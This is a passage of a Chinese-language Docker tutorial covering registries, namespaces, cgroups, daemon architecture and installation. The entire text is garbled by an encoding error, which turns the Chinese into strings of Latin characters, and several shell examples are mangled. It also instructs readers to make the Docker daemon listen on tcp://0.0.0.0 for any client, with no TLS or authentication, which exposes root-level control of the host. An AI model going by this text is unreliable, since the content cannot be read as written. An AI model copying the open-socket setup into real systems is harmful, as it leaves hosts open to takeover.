‡ç­¾å¯¹åº”ä¸€ä¸ªé•œåƒã€‚æ‰€ä»¥è¯´ï¼šé•œåƒä»“åº“æ˜¯Dockerç”¨æ¥é›†ä¸­å­˜æ”¾é•œåƒæ–‡ä»¶çš„åœ°æ–¹ç±»ä¼¼äºŽæˆ‘ä»¬ä¹‹å‰å¸¸ç”¨çš„ä»£ç ä»“åº“ã€‚ é€šå¸¸ï¼Œä¸€ä¸ªä»“åº“ä¼šåŒ…å«åŒä¸€ä¸ªè½¯ä»¶ä¸åŒç‰ˆæœ¬çš„é•œåƒï¼Œè€Œæ ‡ç­¾å°±å¸¸ç”¨äºŽå¯¹åº”è¯¥è½¯ä»¶çš„å„ä¸ªç‰ˆæœ¬ ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡&lt;ä»“åº“å&gt;:&lt;æ ‡ç­¾&gt;çš„æ ¼å¼æ¥æŒ‡å®šå…·ä½“æ˜¯è¿™ä¸ªè½¯ä»¶å“ªä¸ªç‰ˆæœ¬çš„é•œåƒã€‚å¦‚æžœä¸ç»™å‡ºæ ‡ç­¾ï¼Œå°†ä»¥ latest ä½œä¸ºé»˜è®¤æ ‡ç­¾.ã€‚ è¿™é‡Œè¡¥å……ä¸€ä¸‹Docker Registry å…¬å¼€æœåŠ¡å’Œç§æœ‰ Docker Registryçš„æ¦‚å¿µï¼š Docker Registry å…¬å¼€æœåŠ¡ æ˜¯å¼€æ”¾ç»™ç”¨æˆ·ä½¿ç”¨ã€å…è®¸ç”¨æˆ·ç®¡ç†é•œåƒçš„ Registry æœåŠ¡ã€‚ä¸€èˆ¬è¿™ç±»å…¬å¼€æœåŠ¡å…è®¸ç”¨æˆ·å…è´¹ä¸Šä¼ ã€ä¸‹è½½å…¬å¼€çš„é•œåƒï¼Œå¹¶å¯èƒ½æä¾›æ”¶è´¹æœåŠ¡ä¾›ç”¨æˆ·ç®¡ç†ç§æœ‰é•œåƒã€‚ æœ€å¸¸ä½¿ç”¨çš„ Registry å…¬å¼€æœåŠ¡æ˜¯å®˜æ–¹çš„ Docker Hub ï¼Œè¿™ä¹Ÿæ˜¯é»˜è®¤çš„ Registryï¼Œå¹¶æ‹¥æœ‰å¤§é‡çš„é«˜è´¨é‡çš„å®˜æ–¹é•œåƒï¼Œç½‘å€ä¸ºï¼šhttps://hub.docker.com/ ã€‚åœ¨å›½å†…è®¿é—®Docker Hub å¯èƒ½ä¼šæ¯”è¾ƒæ…¢å›½å†…ä¹Ÿæœ‰ä¸€äº›äº‘æœåŠ¡å•†æä¾›ç±»ä¼¼äºŽ Docker Hub çš„å…¬å¼€æœåŠ¡ã€‚æ¯”å¦‚ æ—¶é€Ÿäº‘é•œåƒåº“ã€ç½‘æ˜“äº‘é•œåƒæœåŠ¡ã€DaoCloud é•œåƒå¸‚åœºã€é˜¿é‡Œäº‘é•œåƒåº“ç­‰ã€‚ä¾‹å¦‚ï¼šé…ç½®é˜¿é‡Œäº‘é•œåƒåŠ é€Ÿå™¨ é’ˆå¯¹Dockerå®¢æˆ·ç«¯ç‰ˆæœ¬å¤§äºŽ 1.10.0 çš„ç”¨æˆ· æ‚¨å¯ä»¥é€šè¿‡ä¿®æ”¹daemoné…ç½®æ–‡ä»¶/etc/docker/daemon.jsonæ¥ä½¿ç”¨åŠ é€Ÿå™¨ ä¹Ÿå°±æ˜¯æ‰§è¡Œä¸‹é¢çš„shellè„šæœ¬å³å¯ 12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; "registry-mirrors": ["https://xxxxxxx.mirror.aliyuncs.com"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker é™¤äº†ä½¿ç”¨å…¬å¼€æœåŠ¡å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åœ¨ æœ¬åœ°æ­å»ºç§æœ‰ Docker Registry ã€‚Docker å®˜æ–¹æä¾›äº† Docker Registry é•œåƒï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨åšä¸ºç§æœ‰ Registry æœåŠ¡ã€‚å¼€æºçš„ Docker Registry é•œåƒåªæä¾›äº† Docker Registry API çš„æœåŠ¡ç«¯å®žçŽ°ï¼Œè¶³ä»¥æ”¯æŒ docker å‘½ä»¤ï¼Œä¸å½±å“ä½¿ç”¨ã€‚ä½†ä¸åŒ…å«å›¾å½¢ç•Œé¢ï¼Œä»¥åŠé•œåƒç»´æŠ¤ã€ç”¨æˆ·ç®¡ç†ã€è®¿é—®æŽ§åˆ¶ç­‰é«˜çº§åŠŸèƒ½ã€‚ å‘½åç©ºé—´(Namespaces)pid namespace ä¸åŒç”¨æˆ·çš„è¿›ç¨‹å°±æ˜¯é€šè¿‡ pid namespace éš”ç¦»å¼€çš„ï¼Œä¸”ä¸åŒ namespace ä¸­å¯ä»¥æœ‰ç›¸åŒ PIDã€‚å…·æœ‰ä»¥ä¸‹ç‰¹å¾: æ¯ä¸ª namespace ä¸­çš„ pid æ˜¯æœ‰è‡ªå·±çš„ pid=1 çš„è¿›ç¨‹(ç±»ä¼¼ /sbin/init è¿›ç¨‹) æ¯ä¸ª namespace ä¸­çš„è¿›ç¨‹åªèƒ½å½±å“è‡ªå·±çš„åŒä¸€ä¸ª namespace æˆ–å­ namespace ä¸­çš„è¿›ç¨‹ å› ä¸º /proc åŒ…å«æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œå› æ­¤åœ¨ container ä¸­çš„ pseudo-filesystem çš„ /proc ç›®å½•åªèƒ½çœ‹åˆ°è‡ªå·± namespace ä¸­çš„è¿›ç¨‹ å› ä¸º namespace å…è®¸åµŒå¥—ï¼Œçˆ¶ namespace å¯ä»¥å½±å“å­ namespace çš„è¿›ç¨‹ï¼Œæ‰€ä»¥å­ namespace çš„è¿›ç¨‹å¯ä»¥åœ¨çˆ¶ namespace ä¸­çœ‹åˆ°ï¼Œä½†æ˜¯å…·æœ‰ä¸åŒçš„ pidå‚è€ƒæ–‡æ¡£ï¼šIntroduction to Linux namespaces â€“ Part 3: PID mnt namespace ç±»ä¼¼ chrootï¼Œå°†ä¸€ä¸ªè¿›ç¨‹æ”¾åˆ°ä¸€ä¸ªç‰¹å®šçš„ç›®å½•æ‰§è¡Œã€‚mnt namespace å…è®¸ä¸åŒ namespace çš„è¿›ç¨‹çœ‹åˆ°çš„æ–‡ä»¶ç»“æž„ä¸åŒï¼Œè¿™æ ·æ¯ä¸ª namespace ä¸­çš„è¿›ç¨‹æ‰€çœ‹åˆ°çš„æ–‡ä»¶ç›®å½•å°±è¢«éš”ç¦»å¼€äº†ã€‚åŒ chroot ä¸åŒï¼Œæ¯ä¸ª namespace ä¸­çš„ container åœ¨ /proc/mounts çš„ä¿¡æ¯åªåŒ…å«æ‰€åœ¨ namespace çš„ mount pointã€‚ net namespace ç½‘ç»œéš”ç¦»æ˜¯é€šè¿‡ net namespace å®žçŽ°çš„ï¼Œ æ¯ä¸ª net namespace æœ‰ç‹¬ç«‹çš„ network devices, IP addresses, IP routing tables, /proc/net ç›®å½•ã€‚è¿™æ ·æ¯ä¸ª container çš„ç½‘ç»œå°±èƒ½éš”ç¦»å¼€æ¥ã€‚ docker é»˜è®¤é‡‡ç”¨ veth çš„æ–¹å¼å°† container ä¸­çš„è™šæ‹Ÿç½‘å¡åŒ host ä¸Šçš„ä¸€ä¸ª docker bridge è¿žæŽ¥åœ¨ä¸€èµ·ã€‚ å‚è€ƒæ–‡æ¡£ï¼šIntroduction to Linux namespaces â€“ Part 5: NET uts namespace UTS (â€œUNIX Time-sharing Systemâ€) namespace å…è®¸æ¯ä¸ª container æ‹¥æœ‰ç‹¬ç«‹çš„ hostname å’Œ domain name, ä½¿å…¶åœ¨ç½‘ç»œä¸Šå¯ä»¥è¢«è§†ä½œä¸€ä¸ªç‹¬ç«‹çš„èŠ‚ç‚¹è€Œéž Host ä¸Šçš„ä¸€ä¸ªè¿›ç¨‹ã€‚ å‚è€ƒæ–‡æ¡£ï¼šIntroduction to Linux namespaces â€“ Part 1: UTS ipc namespace container ä¸­è¿›ç¨‹äº¤äº’è¿˜æ˜¯é‡‡ç”¨ Linux å¸¸è§çš„è¿›ç¨‹é—´äº¤äº’æ–¹æ³• (interprocess communication - IPC), åŒ…æ‹¬å¸¸è§çš„ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜ã€‚ç„¶è€ŒåŒ VM ä¸åŒï¼Œcontainer çš„è¿›ç¨‹é—´äº¤äº’å®žé™…ä¸Šè¿˜æ˜¯ host ä¸Šå…·æœ‰ç›¸åŒ pid namespace ä¸­çš„è¿›ç¨‹é—´äº¤äº’ï¼Œå› æ­¤éœ€è¦åœ¨IPCèµ„æºç”³è¯·æ—¶åŠ å…¥ namespace ä¿¡æ¯ - æ¯ä¸ª IPC èµ„æºæœ‰ä¸€ä¸ªå”¯ä¸€çš„ 32bit IDã€‚ å‚è€ƒæ–‡æ¡£ï¼šIntroduction to Linux namespaces â€“ Part 2: IPC user namespace æ¯ä¸ª container å¯ä»¥æœ‰ä¸åŒçš„ user å’Œ group id, ä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä»¥ container å†…éƒ¨çš„ç”¨æˆ·åœ¨ container å†…éƒ¨æ‰§è¡Œç¨‹åºè€Œéž Host ä¸Šçš„ç”¨æˆ·ã€‚ æœ‰äº†ä»¥ä¸Š 6 ç§ namespace ä»Žè¿›ç¨‹ã€ç½‘ç»œã€IPCã€æ–‡ä»¶ç³»ç»Ÿã€UTS å’Œç”¨æˆ·è§’åº¦çš„éš”ç¦»ï¼Œä¸€ä¸ª container å°±å¯ä»¥å¯¹å¤–å±•çŽ°å‡ºä¸€ä¸ªç‹¬ç«‹è®¡ç®—æœºçš„èƒ½åŠ›ï¼Œå¹¶ä¸”ä¸åŒ container ä»Ž OS å±‚é¢å®žçŽ°äº†éš”ç¦»ã€‚ ç„¶è€Œä¸åŒ namespace ä¹‹é—´èµ„æºè¿˜æ˜¯ç›¸äº’ç«žäº‰çš„ï¼Œä»ç„¶éœ€è¦ç±»ä¼¼ ulimit æ¥ç®¡ç†æ¯ä¸ª container æ‰€èƒ½ä½¿ç”¨çš„èµ„æº - cgroupã€‚ Reference Docker Getting Start: Related Knowledge Docker ä»‹ç»ä»¥åŠå…¶ç›¸å…³æœ¯è¯­ã€åº•å±‚åŽŸç†å’ŒæŠ€æœ¯ èµ„æºé…é¢(cgroups)cgroups å®žçŽ°äº†å¯¹èµ„æºçš„é…é¢å’Œåº¦é‡ã€‚ cgroups çš„ä½¿ç”¨éžå¸¸ç®€å•ï¼Œæä¾›ç±»ä¼¼æ–‡ä»¶çš„æŽ¥å£ï¼Œåœ¨ /cgroup ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹å³å¯æ–°å»ºä¸€ä¸ª groupï¼Œåœ¨æ­¤æ–‡ä»¶å¤¹ä¸­æ–°å»º task æ–‡ä»¶ï¼Œå¹¶å°† pid å†™å…¥è¯¥æ–‡ä»¶ï¼Œå³å¯å®žçŽ°å¯¹è¯¥è¿›ç¨‹çš„èµ„æºæŽ§åˆ¶ã€‚å…·ä½“çš„èµ„æºé…ç½®é€‰é¡¹å¯ä»¥åœ¨è¯¥æ–‡ä»¶å¤¹ä¸­æ–°å»ºå­ subsystem ï¼Œ{å­ç³»ç»Ÿå‰ç¼€}.{èµ„æºé¡¹} æ˜¯å…¸åž‹çš„é…ç½®æ–¹æ³•ï¼Œ å¦‚ memory.usageinbytes å°±å®šä¹‰äº†è¯¥ group åœ¨ subsystem memory ä¸­çš„ä¸€ä¸ªå†…å­˜é™åˆ¶é€‰é¡¹ã€‚ å¦å¤–ï¼Œcgroups ä¸­çš„ subsystem å¯ä»¥éšæ„ç»„åˆï¼Œä¸€ä¸ª subsystem å¯ä»¥åœ¨ä¸åŒçš„ group ä¸­ï¼Œä¹Ÿå¯ä»¥ä¸€ä¸ª group åŒ…å«å¤šä¸ª subsystem - ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ª subsystemã€‚ memory å†…å­˜ç›¸å…³çš„é™åˆ¶ cpu åœ¨ cgroup ä¸­ï¼Œå¹¶ä¸èƒ½åƒç¡¬ä»¶è™šæ‹ŸåŒ–æ–¹æ¡ˆä¸€æ ·èƒ½å¤Ÿå®šä¹‰ CPU èƒ½åŠ›ï¼Œä½†æ˜¯èƒ½å¤Ÿå®šä¹‰ CPU è½®è½¬çš„ä¼˜å…ˆçº§ï¼Œå› æ­¤å…·æœ‰è¾ƒé«˜ CPU ä¼˜å…ˆçº§çš„è¿›ç¨‹ä¼šæ›´å¯èƒ½å¾—åˆ° CPU è¿ç®—ã€‚ é€šè¿‡å°†å‚æ•°å†™å…¥ cpu.shares ,å³å¯å®šä¹‰æ”¹ cgroup çš„ CPU ä¼˜å…ˆçº§ - è¿™é‡Œæ˜¯ä¸€ä¸ªç›¸å¯¹æƒé‡ï¼Œè€Œéžç»å¯¹å€¼ blkio block IO ç›¸å…³çš„ç»Ÿè®¡å’Œé™åˆ¶ï¼Œbyte/operation ç»Ÿè®¡å’Œé™åˆ¶ (IOPS ç­‰)ï¼Œè¯»å†™é€Ÿåº¦é™åˆ¶ç­‰ï¼Œä½†æ˜¯è¿™é‡Œä¸»è¦ç»Ÿè®¡çš„éƒ½æ˜¯åŒæ­¥ IO devices è®¾å¤‡æƒé™é™åˆ¶ å‚è€ƒæ–‡æ¡£ï¼šhow to use cgroup Dockeræž¶æž„ è¿™å¼ å›¾å±•ç¤ºäº† Docker å®¢æˆ·ç«¯ã€æœåŠ¡ç«¯å’Œ Docker ä»“åº“ï¼ˆå³ Docker Hub å’Œ Docker Cloud ï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹Docker ä¼šåœ¨ Docker ä¸­å¤®ä»“åº“å¯»æ‰¾é•œåƒæ–‡ä»¶ï¼Œè¿™ç§åˆ©ç”¨ä»“åº“ç®¡ç†é•œåƒçš„è®¾è®¡ç†å¿µç±»ä¼¼äºŽ Git ï¼Œå½“ç„¶è¿™ä¸ªä»“åº“æ˜¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ¥æŒ‡å®šçš„ï¼Œç”šè‡³æˆ‘ä»¬å¯ä»¥åˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„ç§æœ‰ä»“åº“ã€‚ Docker çš„æ ¸å¿ƒç»„ä»¶åŒ…æ‹¬ï¼š Docker Client Docker daemon Docker Image Docker Registry Docker Container Docker é‡‡ç”¨çš„æ˜¯ Client/Server æž¶æž„ã€‚å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨è´Ÿè´£æž„å»ºã€è¿è¡Œå’Œåˆ†å‘å®¹å™¨ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¯ä»¥è¿è¡Œåœ¨åŒä¸€ä¸ª Host ä¸Šï¼Œå®¢æˆ·ç«¯ä¹Ÿå¯ä»¥é€šè¿‡ socket æˆ– REST API ä¸Žè¿œç¨‹çš„æœåŠ¡å™¨é€šä¿¡ã€‚ Docker ClientDocker Client ï¼Œä¹Ÿç§° Docker å®¢æˆ·ç«¯ã€‚å®ƒå…¶å®žå°±æ˜¯ Docker æä¾›å‘½ä»¤è¡Œç•Œé¢ (CLI) å·¥å…·ï¼Œæ˜¯è®¸å¤š Docker ç”¨æˆ·ä¸Ž Docker è¿›è¡Œäº¤äº’çš„ä¸»è¦æ–¹å¼ã€‚å®¢æˆ·ç«¯å¯ä»¥æž„å»ºï¼Œè¿è¡Œå’Œåœæ­¢åº”ç”¨ç¨‹åºï¼Œè¿˜å¯ä»¥è¿œç¨‹ä¸ŽDocker_Hostè¿›è¡Œäº¤äº’ã€‚æœ€å¸¸ç”¨çš„ Docker å®¢æˆ·ç«¯å°±æ˜¯ docker å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ docker å‘½ä»¤å¾ˆæ–¹ä¾¿åœ°åœ¨ host ä¸Šæž„å»ºå’Œè¿è¡Œ docker å®¹å™¨ã€‚ Docker daemonDocker daemon æ˜¯æœåŠ¡å™¨ç»„ä»¶ï¼Œä»¥ Linux åŽå°æœåŠ¡çš„æ–¹å¼è¿è¡Œï¼Œæ˜¯ Docker æœ€æ ¸å¿ƒçš„åŽå°è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¹ŸæŠŠå®ƒç§°ä¸ºå®ˆæŠ¤è¿›ç¨‹ã€‚å®ƒè´Ÿè´£å“åº”æ¥è‡ª Docker Client çš„è¯·æ±‚ï¼Œç„¶åŽå°†è¿™äº›è¯·æ±‚ç¿»è¯‘æˆç³»ç»Ÿè°ƒç”¨å®Œæˆå®¹å™¨ç®¡ç†æ“ä½œã€‚è¯¥è¿›ç¨‹ä¼šåœ¨åŽå°å¯åŠ¨ä¸€ä¸ª API Server ï¼Œè´Ÿè´£æŽ¥æ”¶ç”± Docker Client å‘é€çš„è¯·æ±‚ï¼ŒæŽ¥æ”¶åˆ°çš„è¯·æ±‚å°†é€šè¿‡Docker daemon å†…éƒ¨çš„ä¸€ä¸ªè·¯ç”±åˆ†å‘è°ƒåº¦ï¼Œç”±å…·ä½“çš„å‡½æ•°æ¥æ‰§è¡Œè¯·æ±‚ã€‚ æˆ‘ä»¬å¤§è‡´å¯ä»¥å°†å…¶åˆ†ä¸ºä»¥ä¸‹ä¸‰éƒ¨åˆ†ï¼š Docker Server Engine JobDocker Daemonçš„æž¶æž„å¦‚ä¸‹æ‰€ç¤ºï¼š Docker Daemon å¯ä»¥è®¤ä¸ºæ˜¯é€šè¿‡ Docker Server æ¨¡å—æŽ¥å— Docker Client çš„è¯·æ±‚ï¼Œå¹¶åœ¨ Engine ä¸­å¤„ç†è¯·æ±‚ï¼Œç„¶åŽæ ¹æ®è¯·æ±‚ç±»åž‹ï¼Œåˆ›å»ºå‡ºæŒ‡å®šçš„ Job å¹¶è¿è¡Œã€‚ Docker Daemon è¿è¡Œåœ¨ Docker host ä¸Šï¼Œè´Ÿè´£åˆ›å»ºã€è¿è¡Œã€ç›‘æŽ§å®¹å™¨ï¼Œæž„å»ºã€å­˜å‚¨é•œåƒã€‚ è¿è¡Œè¿‡ç¨‹çš„ä½œç”¨æœ‰ä»¥ä¸‹å‡ ç§å¯èƒ½ï¼š å‘ Docker Registry èŽ·å–é•œåƒ é€šè¿‡ graphdriver æ‰§è¡Œå®¹å™¨é•œåƒçš„æœ¬åœ°åŒ–æ“ä½œ é€šè¿‡ networkdriver æ‰§è¡Œå®¹å™¨ç½‘ç»œçŽ¯å¢ƒçš„é…ç½® é€šè¿‡ execdriver æ‰§è¡Œå®¹å™¨å†…éƒ¨è¿è¡Œçš„æ‰§è¡Œå·¥ä½œ ç”±äºŽ Docker Daemon å’Œ Docker Client çš„å¯åŠ¨éƒ½æ˜¯é€šè¿‡å¯æ‰§è¡Œæ–‡ä»¶ docker æ¥å®Œæˆçš„ï¼Œå› æ­¤ä¸¤è€…çš„å¯åŠ¨æµç¨‹éžå¸¸ç›¸ä¼¼ã€‚ Docker å¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶ï¼Œè¿è¡Œä»£ç é€šè¿‡ä¸åŒçš„å‘½ä»¤è¡Œ flag å‚æ•°ï¼ŒåŒºåˆ†ä¸¤è€…ï¼Œå¹¶æœ€ç»ˆè¿è¡Œä¸¤è€…å„è‡ªç›¸åº”çš„éƒ¨åˆ†ã€‚ å¯åŠ¨ Docker Daemon æ—¶ï¼Œä¸€èˆ¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å®Œæˆ 123docker --daemon = truedocker â€“ddocker â€“d = true å†ç”± docker çš„ main() å‡½æ•°æ¥è§£æžä»¥ä¸Šå‘½ä»¤çš„ç›¸åº” flag å‚æ•°ï¼Œå¹¶æœ€ç»ˆå®Œæˆ Docker Daemon çš„å¯åŠ¨ã€‚ ä¸‹å›¾å¯ä»¥å¾ˆç›´è§‚åœ°çœ‹åˆ° Docker Daemon çš„å¯åŠ¨æµç¨‹ï¼š é»˜è®¤é…ç½®ä¸‹ï¼Œ Docker daemon åªèƒ½å“åº”æ¥è‡ªæœ¬åœ° Host çš„å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æžœè¦å…è®¸è¿œç¨‹å®¢æˆ·ç«¯è¯·æ±‚ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­æ‰“å¼€ TCP ç›‘å¬ã€‚æˆ‘ä»¬å¯ä»¥ç…§ç€å¦‚ä¸‹æ­¥éª¤è¿›è¡Œé…ç½®ï¼š 1ã€ç¼–è¾‘é…ç½®æ–‡ä»¶ /etc/systemd/system/multi-user.target.wants/docker.service ï¼Œåœ¨çŽ¯å¢ƒå˜é‡ ExecStart åŽé¢æ·»åŠ  -H tcp://0.0.0.0ï¼Œå…è®¸æ¥è‡ªä»»æ„ IP çš„å®¢æˆ·ç«¯è¿žæŽ¥ã€‚ 2ã€é‡å¯ Docker daemon 12systemctl daemon-reloadsystemctl restart docker.service 3ã€æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹å‘½ä»¤å³å¯å®žçŽ°ä¸Žè¿œç¨‹æœåŠ¡å™¨é€šä¿¡ 1docker -H æœåŠ¡å™¨IPåœ°å€ info -H æ˜¯ç”¨æ¥æŒ‡å®šæœåŠ¡å™¨ä¸»æœºï¼Œ info å­å‘½ä»¤ç”¨äºŽæŸ¥çœ‹ Docker æœåŠ¡å™¨çš„ä¿¡æ¯ Docker ImageDocker é•œåƒå¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€çŽ¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æž„å»ºä¹‹åŽä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚æˆ‘ä»¬å¯å°† Docker é•œåƒçœ‹æˆåªè¯»æ¨¡æ¿ï¼Œé€šè¿‡å®ƒå¯ä»¥åˆ›å»º Docker å®¹å™¨ã€‚ é•œåƒæœ‰å¤šç§ç”Ÿæˆæ–¹æ³•ï¼š ä»Žæ— åˆ°æœ‰å¼€å§‹åˆ›å»ºé•œåƒ ä¸‹è½½å¹¶ä½¿ç”¨åˆ«äººåˆ›å»ºå¥½çš„çŽ°æˆçš„é•œåƒ åœ¨çŽ°æœ‰é•œåƒä¸Šåˆ›å»ºæ–°çš„é•œåƒ æˆ‘ä»¬å¯ä»¥å°†é•œåƒçš„å†…å®¹å’Œåˆ›å»ºæ­¥éª¤æè¿°åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶è¢«ç§°ä½œ Dockerfile ï¼Œé€šè¿‡æ‰§è¡Œ docker build &lt;docker-file&gt; å‘½ä»¤å¯ä»¥æž„å»ºå‡º Docker é•œåƒ,åŽé¢ä¼šè¯¦ç»†ä»‹ç»è¿™ä¸ªé—®é¢˜ Docker Registry&amp;Containerå‰é¢åœ¨è®²åŸºæœ¬æ¦‚å¿µçš„æ—¶å€™å®žé™…ä¸Šå·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œä¸è¿‡å¤šè§£é‡Š Docker registry æ˜¯å­˜å‚¨ docker image çš„ä»“åº“ï¼Œå®ƒåœ¨ docker ç”Ÿæ€çŽ¯å¢ƒä¸­çš„ä½ç½®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿è¡Œdocker pushã€docker pullã€docker searchæ—¶ï¼Œå®žé™…ä¸Šæ˜¯é€šè¿‡ docker daemon ä¸Ž docker registry é€šä¿¡ã€‚ Docker å®¹å™¨å°±æ˜¯ Docker é•œåƒçš„è¿è¡Œå®žä¾‹ï¼Œæ˜¯çœŸæ­£è¿è¡Œé¡¹ç›®ç¨‹åºã€æ¶ˆè€—ç³»ç»Ÿèµ„æºã€æä¾›æœåŠ¡çš„åœ°æ–¹ã€‚ Docker Container æä¾›äº†ç³»ç»Ÿç¡¬ä»¶çŽ¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Docker Images è¿™äº›åˆ¶ä½œå¥½çš„ç³»ç»Ÿç›˜ï¼Œå†åŠ ä¸Šæˆ‘ä»¬æ‰€ç¼–å†™å¥½çš„é¡¹ç›®ä»£ç ï¼Œ run ä¸€ä¸‹å°±å¯ä»¥æä¾›æœåŠ¡å•¦ã€‚ Dockerçš„æ¦‚å¿µåŸºæœ¬ä¸Šå·²ç»è®²å®Œï¼Œæœ€åŽæˆ‘ä»¬è°ˆè°ˆï¼šBuild, Ship, and Runã€‚ æœ€åŽè°ˆè°ˆ:Build Ship and Runå¦‚æžœä½ æœç´¢Dockerå®˜ç½‘ï¼Œä¼šå‘çŽ°å¦‚ä¸‹çš„å­—æ ·ï¼šâ€œDocker - Build, Ship, and Run Any App, Anywhereâ€ã€‚é‚£ä¹ˆBuild, Ship, and Runåˆ°åº•æ˜¯åœ¨å¹²ä»€ä¹ˆå‘¢ï¼Ÿ Buildï¼ˆæž„å»ºé•œåƒï¼‰ ï¼š é•œåƒå°±åƒæ˜¯é›†è£…ç®±åŒ…æ‹¬æ–‡ä»¶ä»¥åŠè¿è¡ŒçŽ¯å¢ƒç­‰ç­‰èµ„æºã€‚ Shipï¼ˆè¿è¾“é•œåƒï¼‰ ï¼šä¸»æœºå’Œä»“åº“é—´è¿è¾“ï¼Œè¿™é‡Œçš„ä»“åº“å°±åƒæ˜¯è¶…çº§ç å¤´ä¸€æ ·ã€‚ Run ï¼ˆè¿è¡Œé•œåƒï¼‰ ï¼šè¿è¡Œçš„é•œåƒå°±æ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œå®¹å™¨å°±æ˜¯è¿è¡Œç¨‹åºçš„åœ°æ–¹ã€‚ Docker è¿è¡Œè¿‡ç¨‹ä¹Ÿå°±æ˜¯åŽ»ä»“åº“æŠŠé•œåƒæ‹‰åˆ°æœ¬åœ°ï¼Œç„¶åŽç”¨ä¸€æ¡å‘½ä»¤æŠŠé•œåƒè¿è¡Œèµ·æ¥å˜æˆå®¹å™¨ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¹Ÿå¸¸å¸¸å°†Dockerç§°ä¸ºç å¤´å·¥äººæˆ–ç å¤´è£…å¸å·¥ï¼Œè¿™å’ŒDockerçš„ä¸­æ–‡ç¿»è¯‘æ¬è¿å·¥äººå¦‚å‡ºä¸€è¾™ã€‚ é‚£ä¹ˆDockerç»„ä»¶æ˜¯å¦‚ä½•åä½œè¿è¡Œå®¹å™¨çš„å‘¢ï¼Ÿ å®¹å™¨å¯åŠ¨è¿‡ç¨‹å¦‚ä¸‹ï¼š Docker å®¢æˆ·ç«¯æ‰§è¡Œ docker run å‘½ä»¤ Docker daemon å‘çŽ°æœ¬åœ°æ²¡æœ‰ hello-world é•œåƒ daemon ä»Ž Docker Hub ä¸‹è½½é•œåƒ ä¸‹è½½å®Œæˆï¼Œé•œåƒ hello-world è¢«ä¿å­˜åˆ°æœ¬åœ° Docker daemon å¯åŠ¨å®¹å™¨ Dockerä½¿ç”¨ Dockerçš„å®‰è£…Docker çš„å®‰è£…å’Œä½¿ç”¨æœ‰ä¸€äº›å‰ææ¡ä»¶ï¼Œä¸»è¦ä½“çŽ°åœ¨ä½“ç³»æž¶æž„å’Œå†…æ ¸çš„æ”¯æŒä¸Šã€‚å¯¹äºŽä½“ç³»æž¶æž„ï¼Œé™¤äº† Docker ä¸€å¼€å§‹å°±æ”¯æŒçš„ X86-64 ï¼Œå…¶ä»–ä½“ç³»æž¶æž„çš„æ”¯æŒåˆ™ä¸€ç›´åœ¨ä¸æ–­åœ°å®Œå–„å’ŒæŽ¨è¿›ä¸­ã€‚ Docker åˆ†ä¸º CE å’Œ EE ä¸¤å¤§ç‰ˆæœ¬ã€‚ CE å³ç¤¾åŒºç‰ˆï¼ˆå…è´¹ï¼Œæ”¯æŒå‘¨æœŸ 7 ä¸ªæœˆï¼‰ï¼Œ EE å³ä¼ä¸šç‰ˆï¼Œå¼ºè°ƒå®‰å…¨ï¼Œä»˜è´¹ä½¿ç”¨ï¼Œæ”¯æŒå‘¨æœŸ 24 ä¸ªæœˆã€‚ æˆ‘ä»¬åœ¨å®‰è£…å‰å¯ä»¥å‚çœ‹å®˜æ–¹æ–‡æ¡£èŽ·å–æœ€æ–°çš„ Docker æ”¯æŒæƒ…å†µï¼Œå®˜æ–¹æ–‡æ¡£åœ¨è¿™é‡Œï¼š 1https://docs.docker.com/install/ Docker å¯¹äºŽå†…æ ¸æ”¯æŒçš„åŠŸèƒ½ï¼Œå³å†…æ ¸çš„é…ç½®é€‰é¡¹ä¹Ÿæœ‰ä¸€å®šçš„è¦æ±‚(æ¯”å¦‚å¿…é¡»å¼€å¯ Cgroup å’Œ Namespace ç›¸å…³é€‰é¡¹ï¼Œä»¥åŠå…¶ä»–çš„ç½‘ç»œå’Œå­˜å‚¨é©±åŠ¨ç­‰)ï¼Œ Docker æºç 